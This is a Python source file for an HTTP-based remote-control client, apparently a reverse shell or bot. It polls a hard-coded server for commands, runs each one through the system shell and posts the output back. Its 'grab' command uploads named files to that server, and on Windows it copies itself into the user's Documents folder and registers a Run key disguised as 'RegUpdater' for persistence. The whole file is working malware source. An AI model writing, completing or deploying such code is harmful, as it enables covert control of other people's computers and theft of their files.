#!/usr/bin/env python

#Python 3
#Http client

import requests
import time
import subprocess
import sys
import os

import winreg as wreg
import shutil
import platform

SERVER_IP = "192.168.0.200"
PORT = 8080
URL = "http://{}:{}".format(SERVER_IP, PORT)

def transfer(path):
    if os.path.exists(path):
        with open(path, 'rb') as f :
            files = {'file': f}
            requests.post(URL, files=files)
    else:
        message = "[-] File not found "
        requests.post(URL, data=message)

def win_persistance():
    path = os.getcwd()
    user_profile = os.environ.get('USERPROFILE' , 0)
    if user_profile:
        destination = user_profile + '\\Documents\\' + 'client.exe'
        if not os.path.exists(destination):
            try:
                shutil.copyfile(path + '\client.exe', destination)
                key = wreg.OpenKey(wreg.HKEY_CURRENT_USER,
                        "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
                wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
                key.Close()
                requests.post(URL, data="[+] Persistance achieved")
            except Exception as e:
                print("Error: ", e)
    else:
        requests.post(URL, data="[-] Persistance not achieved!")

while(True):
    try:
        if platform.system() == 'Windows':
           win_persistance()

        req = requests.get(URL, verify=False)
        command = req.text
        print("command ", command)
        if 'exit' in command:
            msg = "[-] Bot was terminated"
            requests.post(URL, data=msg)
            break
        elif 'grab' in command:
            command, path = command.split("*")
            transfer(path)
        else:
            cmd = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            post_response = requests.post(url=URL, data=cmd.stdout.read())
            post_response = requests.post(url=URL, data=cmd.stderr.read())
        #time.sleep(3)
    except KeyboardInterrupt:
        print("Shutting down the HTTP client")
        sys.exit(1)
